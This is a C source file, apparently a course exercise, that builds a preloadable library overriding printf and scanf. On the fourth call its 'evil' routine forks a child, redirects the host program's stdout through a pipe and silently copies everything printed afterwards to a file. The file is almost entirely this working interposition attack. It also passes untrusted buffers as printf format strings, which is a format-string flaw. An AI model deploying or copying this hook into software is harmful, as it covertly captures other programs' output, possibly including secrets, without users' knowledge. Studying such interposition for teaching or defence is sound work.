#include <stdint.h>
#include <dlfcn.h>
#include <stdarg.h>

#include <stdio.h>
#include <unistd.h>
#include <fcntl.h>
#include <stdlib.h>
/*
 * We aren't providing much code here.  You'll need to implement your own
 * printf() and scanf(), as well as any constructors or destructors for your
 * library.
 */

static int call_counter = 0;  //global for tracking number of calls
			      //made to scanf and printf

/*
Loop for reading from pipe and redirecting that output to stdout and file
 */
void evil_process_loop(int pipe_fd){
  FILE * evil;
  //check for env variable specifying filename to write output
  const char* env_evil = getenv("EVILFILENAME");
  if(env_evil == NULL){
    evil = fopen("evil.txt", "w");
  }else{
    evil = fopen(env_evil, "w");
  }
  if(evil == NULL){
    perror("Unable to open output file");
    exit(1);
  }
  char readbuffer[1024];
  int nbytes = read(pipe_fd, readbuffer, sizeof(readbuffer)-1);
  while(nbytes != 0){
    readbuffer[nbytes] = '\0';
    printf(readbuffer); //write to stdout
    if(!fprintf(evil, readbuffer)){ //write to file
      perror("write to evil failed");
    }
    nbytes = read(pipe_fd, readbuffer, sizeof(readbuffer)-1);
  }
  fclose(evil);
  close(pipe_fd);
  exit(1);
}

//Creates evil child process and opens pipe for communication between
//them
//Redirects stdout from parent process to the pipe
void fork_evil_process(){
  perror("forking");
  int pipefd[2];
  //open pipe for child/parent communication
  if(pipe(pipefd) == -1){
    perror("pipe failure");
    return;
  }
  pid_t process_id = fork();
  if(process_id == -1){
    perror("fork error");
    return;
    //child process, enter pipe read loop
  }else if(process_id == 0){
    close(pipefd[1]);
    evil_process_loop(pipefd[0]);
    return;
    //parent, redirect stdout to pipe
  }else{
    close(pipefd[0]);
    dup2(pipefd[1], STDOUT_FILENO);
    return;
  }
}

int printf(const char * format, ...){
  call_counter++;

  if(call_counter == 4){
    fork_evil_process();
  }
  va_list ap;
  va_start(ap, format);
  int ret_val = vprintf(format, ap);
  va_end(ap);
  return ret_val;
}

int scanf(const char * format, ...){
  call_counter++;

  if(call_counter == 4){
    fork_evil_process();
  }
  va_list ap;
  va_start(ap, format);
  int ret_val = vscanf(format, ap);
  va_end(ap);
  return ret_val;
}
